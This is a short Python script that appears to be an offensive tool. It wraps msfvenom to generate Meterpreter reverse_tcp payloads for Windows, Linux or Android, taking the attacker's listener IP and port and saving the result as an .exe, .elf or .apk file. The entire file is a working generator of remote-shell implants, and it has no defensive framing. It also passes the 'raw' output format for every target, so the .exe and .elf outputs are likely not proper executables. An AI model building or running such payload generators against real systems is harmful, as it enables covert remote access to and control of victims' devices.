import subprocess
import os

# Function for displaying the banner
def banner():
    print("""
    ------------------------------------------
    MSFVENOM PAYLOAD GENERATOR (Python)
    ------------------------------------------
    """)

# Collect user input for payload configuration
def get_user_input():
    lhost = input("Enter LHOST (your IP): ")
    lport = input("Enter LPORT (your listener port): ")

    print("Choose target OS:")
    print("1. Windows")
    print("2. Linux")
    print("3. Android")
    os_choice = input("Enter choice (1-3): ")

    payloads = {
        "1": "windows/meterpreter/reverse_tcp",
        "2": "linux/x86/meterpreter/reverse_tcp",
        "3": "android/meterpreter/reverse_tcp"
    }

    extensions = {
        "1": ".exe",
        "2": ".elf",
        "3": ".apk"
    }

    if os_choice not in payloads:
        print("Invalid choice. Exiting.")
        exit()

    return payloads[os_choice], extensions[os_choice], lhost, lport

# Generate the payload using msfvenom
def generate_payload(payload, extension, lhost, lport):
    filename = f"payload{extension}"
    print(f"\n[+] Generating payload: {filename}")

    command = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "raw",
        "-o", filename
    ]

    try:
        subprocess.run(command, check=True)
        print(f"[+] Payload saved as: {filename}")
    except subprocess.CalledProcessError:
        print("[-] Payload generation failed.")

# Main function to run the script
def main():
    banner()
    payload, extension, lhost, lport = get_user_input()
    generate_payload(payload, extension, lhost, lport)

# Entry point
if __name__ == "__main__":
    main()